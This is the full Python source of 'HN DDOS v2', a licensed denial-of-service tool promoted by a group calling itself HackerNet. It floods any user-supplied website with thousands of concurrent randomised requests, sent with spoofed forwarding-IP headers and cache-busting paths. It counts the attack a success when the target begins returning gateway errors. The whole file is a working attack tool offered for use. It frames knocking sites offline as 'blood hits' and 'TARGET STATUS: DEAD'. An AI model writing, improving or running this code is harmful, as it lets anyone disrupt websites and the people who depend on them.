#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
HN DDOS v2 — Nuclear Flood Engine (KeyAuth Protected - FINAL CLEAN)
"""

import asyncio
import aiohttp
import random
import sys
import time
import os
import hashlib
import json
import requests
from collections import Counter
from urllib.parse import urlparse

# ============================================================
# 🔥 SUPPRESS SSL WARNINGS (YEH WARNING HATAYEGA)
# ============================================================
import warnings
warnings.filterwarnings("ignore")

# ============================================================
# COLORS
# ============================================================

class C:
    R = "\033[0m"
    B = "\033[1m"
    D = "\033[2m"
    CY = "\033[96m"
    DC = "\033[36m"
    BC = "\033[1;96m"
    GR = "\033[92m"
    LG = "\033[38;5;118m"
    RD = "\033[91m"
    DR = "\033[31m"
    WH = "\033[97m"
    GY = "\033[90m"
    YW = "\033[93m"
    MG = "\033[95m"
    OR = "\033[38;5;208m"
    BG = "\033[40m"

def clr():
    os.system("cls" if os.name == "nt" else "clear")

def tw(s, d=0.004, end="\n"):
    for ch in s:
        sys.stdout.write(ch)
        sys.stdout.flush()
        time.sleep(d)
    if end:
        print(end, end="")

# ============================================================
# 🔑 KEYAUTH - INIT + LICENSE (FULL)
# ============================================================

def getchecksum():
    try:
        with open(__file__, 'rb') as f:
            return hashlib.sha256(f.read()).hexdigest()
    except:
        return ""

# Global session ID
SESSION_ID = None

def keyauth_init():
    """Initialize KeyAuth session"""
    global SESSION_ID
    
    endpoints = [
        "https://keyauth.win/api/1.2/",
        "https://keyauth.com/api/1.2/"
    ]
    
    payload = {
        "type": "init",
        "name": "hnddos",
        "ownerid": "YTwjDe2Oz4",
        "version": "1.0",
        "hash": getchecksum()
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json"
    }
    
    for url in endpoints:
        try:
            response = requests.post(url, data=payload, headers=headers, timeout=10, verify=False)
            if response.status_code == 200:
                data = response.json()
                if data.get("success"):
                    SESSION_ID = data.get("sessionid")
                    return True, data
                else:
                    return False, data.get("message", "Init failed")
        except:
            continue
    
    return False, "All endpoints failed"

def verify_license_key(key):
    """License check with session ID"""
    global SESSION_ID
    
    if SESSION_ID is None:
        success, msg = keyauth_init()
        if not success:
            return False, f"Init failed: {msg}"
    
    key = key.strip()
    
    endpoints = [
        "https://keyauth.win/api/1.2/",
        "https://keyauth.com/api/1.2/"
    ]
    
    payload = {
        "type": "license",
        "key": key,
        "hwid": "dummy-hwid-12345678901234567890",
        "sessionid": SESSION_ID,
        "name": "hnddos",
        "ownerid": "YTwjDe2Oz4"
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json"
    }
    
    for url in endpoints:
        try:
            response = requests.post(url, data=payload, headers=headers, timeout=10, verify=False)
            if response.status_code == 200:
                data = response.json()
                if data.get("success"):
                    return True, data.get("info", {})
                else:
                    return False, data.get("message", "Invalid key")
        except:
            continue
    
    return False, "All endpoints failed"

def verify_license():
    global SESSION_ID
    
    print(f"{C.CY}{C.B}")
    print("  ╔══════════════════════════════════════════╗")
    print("  ║      🔐 LICENSE VERIFICATION            ║")
    print("  ╚══════════════════════════════════════════╝")
    print(f"{C.R}")
    
    # First, init
    print(f"{C.GY}[*] Initializing KeyAuth session...{C.R}")
    success, msg = keyauth_init()
    if not success:
        print(f"{C.RD}❌ Init failed: {msg}{C.R}")
        return False
    print(f"{C.GR}✅ Session initialized!{C.R}")
    
    if os.path.exists("license.txt"):
        with open("license.txt", "r") as f:
            saved_key = f.read().strip()
        success, info = verify_license_key(saved_key)
        if success:
            print(f"{C.GR}✅ Auto-login successful!{C.R}")
            username = info.get("username", "N/A")
            expiry = info.get("subscriptions", [{}])[0].get("expiry", "N/A")
            print(f"{C.GY}👤 User: {username}{C.R}")
            print(f"{C.GY}📅 Expires: {expiry}{C.R}")
            return True
        else:
            print(f"{C.RD}⚠️ Saved key invalid: {info}{C.R}")
            os.remove("license.txt")
    
    attempts = 0
    while attempts < 3:
        user_key = input(f"{C.CY}🔑 Enter license key: {C.WH}").strip()
        if not user_key:
            print(f"{C.RD}❌ Key cannot be empty!{C.R}")
            attempts += 1
            continue
            
        success, info = verify_license_key(user_key)
        if success:
            with open("license.txt", "w") as f:
                f.write(user_key)
            print(f"{C.GR}✅ License verified!{C.R}")
            username = info.get("username", "N/A")
            expiry = info.get("subscriptions", [{}])[0].get("expiry", "N/A")
            print(f"{C.GY}👤 User: {username}{C.R}")
            print(f"{C.GY}📅 Expires: {expiry}{C.R}")
            return True
        else:
            attempts += 1
            remaining = 3 - attempts
            print(f"{C.RD}❌ {info} ({remaining} tries left){C.R}")
            if remaining == 0:
                print(f"{C.RD}💀 Too many failed attempts. Exiting...{C.R}")
                return False
    
    return False

# ============================================================
# BANNER + ANIMATIONS
# ============================================================

LOGO = r"""
      ██░ ██  ███▄    █    ▓█████▄ ▓█████▄  ▒█████    ██████      
      ▓██░ ██▒ ██ ▀█   █    ▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒      
      ▒██▀▀██░▓██  ▀█ ██▒   ░██   █▌░██   █▌▒██░  ██▒░ ▓██▄        
      ░▓█ ░██ ▓██▒  ▐▌██▒   ░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒     
      ░▓█▒░██▓▒██░   ▓██░   ░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒     
       ▒ ░░▒░▒░ ▒░   ▒ ▒     ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░     
       ▒ ░▒░ ░░ ░░   ░ ▒░    ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░     
       ░  ░░ ░   ░   ░ ░     ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░       
       ░  ░  ░         ░       ░       ░        ░ ░        ░       
                             ░       ░                              
"""

GLOBE_FRAMES = [
    "🌍  SCANNING GRID...",
    "🌎  LOCKING NODES...",
    "🌏  ROUTING PACKETS...",
    "🌐  SATELLITES ONLINE...",
    "🌍  TARGET ACQUIRED...",
    "🌎  FLOOD CHANNEL OPEN...",
    "🌏  CYBER ORBIT SYNC...",
    "🌐  WORLD LINK STABLE...",
]

MATRIX = "░▒▓█▀▄▌▐/\\|-_ scr_kiddie@root# $ 01"

def matrix_rain(lines=6, width=68, delay=0.03):
    for _ in range(lines):
        row = "".join(random.choice(MATRIX) for _ in range(width))
        print(f"{C.DC}{C.D}  {row}{C.R}")
        time.sleep(delay)

def globe_spin(rounds=2):
    for _ in range(rounds):
        for frame in GLOBE_FRAMES:
            sys.stdout.write(f"\r{C.CY}{C.B}  {frame}          {C.R}")
            sys.stdout.flush()
            time.sleep(0.09)
    print()

def boom_line(text, color=C.CY):
    bar = "═" * 64
    print(f"{C.DR}  {bar}{C.R}")
    print(f"{color}{C.B}  {text}{C.R}")
    print(f"{C.DR}  {bar}{C.R}")

def show_banner():
    clr()
    print(f"{C.DR}{C.BG}" + "░" * 70 + f"{C.R}")
    print(f"{C.RD}{C.BG}" + "▓" * 70 + f"{C.R}\n")
    for line in LOGO.splitlines():
        if not line.strip():
            print()
            continue
        tw(f"{C.BC}{C.BG}{line}{C.R}", d=0.0012, end="\n")
        time.sleep(0.015)
    for i in range(5):
        g = "".join(random.choice("░▒▓█☠✦") for _ in range(10))
        sys.stdout.write(
            f"\r{C.DC}{C.BG}          {g}  H N   D D O S   v 2  {g}     {C.R}"
        )
        sys.stdout.flush()
        time.sleep(0.07)
        sys.stdout.write(
            f"\r{C.BC}{C.B}{C.BG}          ▓▓▓▓  H N   D D O S   v 2  ▓▓▓▓           {C.R}"
        )
        sys.stdout.flush()
        time.sleep(0.07)
    print("\n")
    boom_line("▓▓▓  BLOODY LAYER-7 NUCLEAR FLOOD ENGINE  ▓▓▓", C.RD)
    print()
    tw(f"{C.MG}{C.B}       one and only devil if virtual world : HackerNet 😈🔥{C.R}", d=0.012)
    print(f"{C.GY}                     ☠  authorized black-ops only  ☠{C.R}\n")
    print(f"{C.GR}💬 Join WhatsApp: {C.CY}https://whatsapp.com/channel/0029VajXwL6AYlUQ0YPBzA2U{C.R}")
    print(f"{C.MG}📱 Instagram: {C.CY}https://www.instagram.com/hackernet_0101{C.R}")
    matrix_rain()
    globe_spin()
    print()

# ============================================================
# LIVE HUD
# ============================================================

SPIN = ["🌍", "🌎", "🌏", "🌐"]
spin_i = 0

def hud_line(req_id, total, method, status, rps, mode="ok"):
    global spin_i
    spin_i = (spin_i + 1) % len(SPIN)
    world = SPIN[spin_i]
    bar_len = 20
    filled = int((req_id / total) * bar_len) if total else 0
    bar = "█" * filled + "░" * (bar_len - filled)
    if mode == "down":
        print(
            f"{C.RD}{C.B}  [☠] {world} {req_id:>6}/{total} │{bar}│ {method:<5} │ "
            f"{status} │ {rps:>6.0f} r/s │ SITE DOWN / BLEEDING{C.R}",
            flush=True,
        )
    elif mode == "fail":
        print(
            f"{C.RD}  [✗] {world} {req_id:>6}/{total} │{bar}│ {method:<5} │ "
            f"--- │ {rps:>6.0f} r/s │ FAIL{C.R}",
            flush=True,
        )
    else:
        print(
            f"{C.GR}{C.B}  [✓] {world} {req_id:>6}/{total} │{bar}│ {method:<5} │ "
            f"{status} │ {rps:>6.0f} r/s │ HIT LANDED{C.R}",
            flush=True,
        )

# ============================================================
# ATTACK ENGINE
# ============================================================

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
]

PATHS = [
    "/",
    "/?id=",
    "/?page=",
    "/?token=",
    "/?q=",
    "/?search=",
    "/?ref=",
    "/api/v1/users?id=",
    "/api/v1/data?ts=",
    "/wp-admin/admin-ajax.php?action=",
]

POST_PAYLOADS = [
    {"data": "A" * 1024},
    {"data": "B" * 2048},
    {"key": "x", "value": "X" * 512},
    {"username": "user", "password": "P" * 256},
]
METHODS = ["GET", "POST", "PUT", "PATCH"]

stats = {
    "ok": 0, "fail": 0, "down_streak": 0,
    "target_down": False, "errors": [],
}
lock = asyncio.Lock()
start_time = 0.0

async def strike(session, sem, req_id, target_url, total_requests):
    global stats
    async with sem:
        try:
            method = random.choice(METHODS)
            path = f"{random.choice(PATHS)}{random.randint(1,999999)}&_={random.randint(1,9999999)}"
            url = f"{target_url.rstrip('/')}{path}"
            
            headers = {
                "User-Agent": random.choice(USER_AGENTS),
                "Accept": random.choice([
                    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "application/json, text/plain, */*",
                    "*/*",
                ]),
                "Accept-Language": random.choice(["en-US,en;q=0.5", "hi-IN,hi;q=0.9,en;q=0.8"]),
                "X-Forwarded-For": ".".join(str(random.randint(1, 255)) for _ in range(4)),
                "X-Real-IP": ".".join(str(random.randint(1, 255)) for _ in range(4)),
                "Referer": random.choice(["https://www.google.com/", f"{target_url}/"]),
                "Origin": target_url.rstrip("/"),
                "Connection": "keep-alive",
                "Cache-Control": "no-cache",
                "Pragma": "no-cache",
            }
            
            timeout = aiohttp.ClientTimeout(total=None, connect=3, sock_read=30)
            status = 0
            payload = random.choice(POST_PAYLOADS)
            
            if method == "GET":
                async with session.get(url, headers=headers, timeout=timeout, ssl=False) as r:
                    await r.read()
                    status = r.status
            elif method == "POST":
                async with session.post(url, json=payload, headers=headers, timeout=timeout, ssl=False) as r:
                    await r.read()
                    status = r.status
            elif method == "PUT":
                async with session.put(url, json=payload, headers=headers, timeout=timeout, ssl=False) as r:
                    await r.read()
                    status = r.status
            else:
                async with session.patch(url, json=payload, headers=headers, timeout=timeout, ssl=False) as r:
                    await r.read()
                    status = r.status
            
            async with lock:
                stats["ok"] += 1
                if status in (502, 503, 504, 521, 522, 523, 524):
                    stats["down_streak"] += 1
                    if stats["down_streak"] >= 12:
                        stats["target_down"] = True
                else:
                    stats["down_streak"] = 0
                    stats["target_down"] = False
            
            if req_id % 50 == 0 or req_id == total_requests:
                elapsed = time.time() - start_time
                rps = stats["ok"] / elapsed if elapsed else 0
                mode = "down" if stats["target_down"] else "ok"
                hud_line(req_id, total_requests, method, status, rps, mode)
                
        except Exception as e:
            async with lock:
                stats["fail"] += 1
                stats["down_streak"] += 1
                stats["errors"].append(type(e).__name__)
                if stats["down_streak"] >= 12:
                    stats["target_down"] = True

async def main_attack(target_url, total_requests, concurrent):
    global start_time, stats
    stats = {"ok": 0, "fail": 0, "down_streak": 0, "target_down": False, "errors": []}
    start_time = time.time()
    
    connector = aiohttp.TCPConnector(limit=0, limit_per_host=0, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        sem = asyncio.Semaphore(concurrent)
        tasks = [strike(session, sem, i, target_url, total_requests) for i in range(1, total_requests + 1)]
        await asyncio.gather(*tasks)
    
    # Final report
    elapsed = time.time() - start_time
    total = stats["ok"] + stats["fail"]
    rps = total / elapsed if elapsed else 0
    rate = (stats["ok"] / total_requests * 100) if total_requests else 0
    
    print()
    if stats["target_down"]:
        print(f"{C.RD}{C.B}")
        print("      ██████╗  ██████╗ ██╗    ██╗███╗   ██╗")
        print("      ██╔══██╗██╔═══██╗██║    ██║████╗  ██║")
        print("      ██║  ██║██║   ██║██║ █╗ ██║██╔██╗ ██║")
        print("      ██║  ██║██║   ██║██║███╗██║██║╚██╗██║")
        print("      ██████╔╝╚██████╔╝╚███╔███╔╝██║ ╚████║")
        print("      ╚═════╝  ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝")
        print(f"{C.R}{C.RD}           ▓▓▓ TARGET STATUS: DEAD ▓▓▓{C.R}")
    else:
        print(f"{C.GR}{C.B}")
        print("      ███████╗██╗██████╗ ███████╗██████╗ ")
        print("      ██╔════╝██║██╔══██╗██╔════╝██╔══██╗")
        print("      █████╗  ██║██████╔╝█████╗  ██║  ██║")
        print("      ██╔══╝  ██║██╔══██╗██╔══╝  ██║  ██║")
        print("      ██║     ██║██║  ██║███████╗██████╔╝")
        print("      ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═════╝ ")
        print(f"{C.R}{C.GR}           ▓▓▓ FLOOD COMPLETE ▓▓▓{C.R}")
    
    print(f"{C.DR}  {'═'*64}{C.R}")
    print(f"{C.WH}  ┌─ TIME      {C.YW}{elapsed:.2f}s{C.R}")
    print(f"{C.WH}  ├─ SPEED     {C.YW}{rps:.0f} req/sec{C.R}")
    print(f"{C.WH}  ├─ HITS      {C.GR}{stats['ok']}{C.R}")
    print(f"{C.WH}  ├─ FAILS     {C.RD}{stats['fail']}{C.R}")
    print(f"{C.WH}  ├─ SUCCESS   {C.CY}{rate:.1f}%{C.R}")
    if stats["errors"]:
        top = Counter(stats["errors"]).most_common(3)
        print(f"{C.WH}  ├─ ERRORS    {C.RD}{' · '.join(f'{e}:{n}' for e,n in top)}{C.R}")
    print(f"{C.WH}  └─ OPERATOR  {C.MG}HackerNet 😈🔥{C.R}")
    print(f"{C.DR}  {'─'*64}{C.R}")
    print(f"{C.GY}       HN DDOS v2 — one and only devil if virtual world{C.R}\n")

# ============================================================
# MAIN
# ============================================================

def main():
    show_banner()
    
    if not verify_license():
        print(f"{C.RD}❌ License verification failed. Exiting...{C.R}")
        sys.exit(1)
    
    print(f"{C.GR}✅ License validated! Starting attack engine...{C.R}\n")
    time.sleep(1)
    
    try:
        TARGET_URL = input(f"{C.CY}  ┌─[{C.RD}TARGET{C.CY}]──► {C.WH}").strip()
        if not TARGET_URL:
            print(f"{C.RD}  [!] Empty target.{C.R}")
            sys.exit(1)
        if not TARGET_URL.startswith(("http://", "https://")):
            TARGET_URL = "https://" + TARGET_URL
        
        REQUEST_COUNT = int(input(f"{C.CY}  ├─[{C.RD}REQUESTS{C.CY}]► {C.WH}") or "10000")
        CONCURRENT = int(input(f"{C.CY}  └─[{C.RD}THREADS{C.CY}]─► {C.WH}") or "500")
        print(C.R)
    except ValueError:
        print(f"{C.RD}  [!] Invalid number.{C.R}")
        sys.exit(1)
    except KeyboardInterrupt:
        print(f"\n{C.RD}  [!] Aborted.{C.R}")
        sys.exit(0)
    
    print(f"{C.DR}  {'─'*64}{C.R}")
    print(f"{C.WH}  ┌─ TARGET     {C.CY}{TARGET_URL}{C.R}")
    print(f"{C.WH}  ├─ PAYLOAD    {C.YW}{REQUEST_COUNT} requests{C.R}")
    print(f"{C.WH}  ├─ CONCURRENT {C.YW}{CONCURRENT} connections{C.R}")
    print(f"{C.WH}  ├─ VECTORS    {C.LG}GET · POST · PUT · PATCH{C.R}")
    print(f"{C.WH}  └─ MODE       {C.RD}NUCLEAR ASYNC + WORLD LINK{C.R}")
    print(f"{C.DR}  {'─'*64}{C.R}")
    print(f"{C.CY}  [*] World link armed... green = blood hits, red = death.{C.R}\n")
    
    globe_spin(1)
    asyncio.run(main_attack(TARGET_URL, REQUEST_COUNT, CONCURRENT))

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C.RD}  [!] Interrupted. Blood spilled: {stats['ok']} hits.{C.R}")
    except RuntimeError:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            loop.run_until_complete(main())
        except KeyboardInterrupt:
            print(f"\n{C.RD}  [!] Interrupted.{C.R}")
        finally:
            loop.close()